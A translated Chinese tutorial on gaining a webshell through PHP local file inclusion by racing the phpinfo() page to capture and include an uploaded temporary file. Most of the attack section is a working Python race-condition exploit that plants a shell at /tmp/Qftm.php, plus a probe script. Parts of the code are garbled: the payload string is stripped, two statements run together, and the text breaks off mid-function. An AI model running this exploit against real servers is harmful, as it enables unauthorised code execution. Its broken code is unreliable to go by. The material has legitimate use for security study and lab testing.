# PHP LFI 利用临时文件 Getshell 姿势
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
最近整理PHP文件包含漏洞姿势的时候，发现一些比较好用的姿势关于本地文件包含漏洞可以利用临时文件包含恶意代码拿到Webshell的一些奇技淫巧，于是打算详细整理一下。
## PHP LFI
PHP
LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。
假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。
目前，常见的两种临时文件包含漏洞利用方法主要是：`PHPINFO()` and `PHP7 Segment
Fault`，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。
## 临时文件
在了解漏洞利用方式的时候，先来了解一下PHP临时文件的机制
###  全局变量
在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。
$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。
    $_FILES['userfile']['name'] 客户端文件的原名称。
    $_FILES['userfile']['type'] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如"image/gif"。
    $_FILES['userfile']['size'] 已上传文件的大小，单位为字节。
    $_FILES['userfile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
    $_FILES['userfile']['error'] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
    $_FILES['userfile']['tmp_name'] 文件被上传后在服务端存储的临时文件名
在临时文件包含漏洞中`$_FILES['userfile']['name']`这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。
###  存储目录
文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的`upload_tmp_dir`属性指定，假如`upload_tmp_dir`的路径不可写，PHP会上传到系统默认的临时目录中。
不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。
**Linux目录**
Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。
    /tmp/
**Windows目录**
Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。
    C:/Windows/
    C:/Windows/Temp/
###  命名规则
存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。
可以通过phpinfo来查看临时文件的信息。
**Linux Temporary File**
Linux临时文件主要存储在`/tmp/`目录下，格式通常是（`/tmp/php[6个随机字符]`）
###  Windows Temporary File
Windows临时文件主要存储在`C:/Windows/`目录下，格式通常是（`C:/Windows/php[4个随机字符].tmp`）
## PHPINFO特性
通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。
虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行卡了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。
###  测试代码
index.php
phpinfo.php
###  漏洞分析
当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。
利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。
###  漏洞利用
  * **利用条件**
    无   PHPINFO的这种特性源于php自身，与php的版本无关
**测试脚本**
编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。
    import requests
    files = {
      'file': ("aa.txt","ssss")
    }
    url = "http://x.x.x.x/phpinfo.php"
    r = requests.post(url=url, files=files, allow_redirects=False)
    print(r.text)
运行脚本向服务器发出请求可以看到回显中有如下内容
`Linux`
`Windows`
**利用原理**
验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。
但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。
**利用过程**
这个时候就需要用到条件竞争，具体原理和过程如下：
（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据
（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大
（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包
（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell
（参考ph牛：[https://github.com/vulhub/vulhub/tree/master/php/inclusion](https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89)
）
**Getshell**
利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等
`exp.py`
    #!/usr/bin/python
    #python version 2.7
    import sys
    import threading
    import socket
    def setup(host, port):
        TAG = "Security Test"
        PAYLOAD = """%sr
    ')?>r""" % TAG
        # PAYLOAD = """%sr
        # ')?>r""" % TAG
        REQ1_DATA = """-----------------------------7dbff1ded0714r
    Content-Disposition: form-data; name="dummyname"; filename="test.txt"r
    Content-Type: text/plainr
    r
    %s
    -----------------------------7dbff1ded0714--r""" % PAYLOAD
        padding = "A" * 5000
        REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1r
    Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """r
    HTTP_ACCEPT: """ + padding + """r
    HTTP_USER_AGENT: """ + padding + """r
    HTTP_ACCEPT_LANGUAGE: """ + padding + """r
    HTTP_PRAGMA: """ + padding + """r
    Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r
    Content-Length: %sr
    Host: %sr
    r
    %s""" % (len(REQ1_DATA), host, REQ1_DATA)
        # modify this to suit the LFI script
        LFIREQ = """GET /index.php?file=%s HTTP/1.1r
    User-Agent: Mozilla/4.0r
    Proxy-Connection: Keep-Aliver
    Host: %sr
    r
    r
    """
        return (REQ1, TAG, LFIREQ)
    def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s2.connect((host, port))
        s.send(phpinforeq)
        d = ""
        while len(d) = self.maxattempts:
                        return
                    counter += 1
                try:
                    x = phpInfoLFI(*self.args)
                    if self.event.is_set():
                        break
                    if x:
                        print "nGot it! Shell created in /tmp/Qftm.php"
                        self.event.set()
                except socket.error:
                    return
    def getOffset(host, port, phpinforeq):
        """Gets offset of tmp_name in the php output"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(phpinforeq)
        d = ""
        while True:
            i = s.recv(4096)
            d += i
            if i == "":
                break
            # detect the final chunk
            if i.endswith("0rnrn"):
                break
        s.close()
        i = d.find("[tmp_name] =&gt; ")
        if i == -1:
            raise ValueError("No php tmp_name in phpinfo output")
        print "found %s at %i" % (d[i:i + 10], i)
        # padded up a bit
        return i + 256
    def main():
        print "LFI With PHPInfo()"
        print "-=" * 30
        if len(sys.argv) < 2:
            print "Usage: %s host [port] [threads]" % sys.argv[0]
            sys.exit(1)
        try: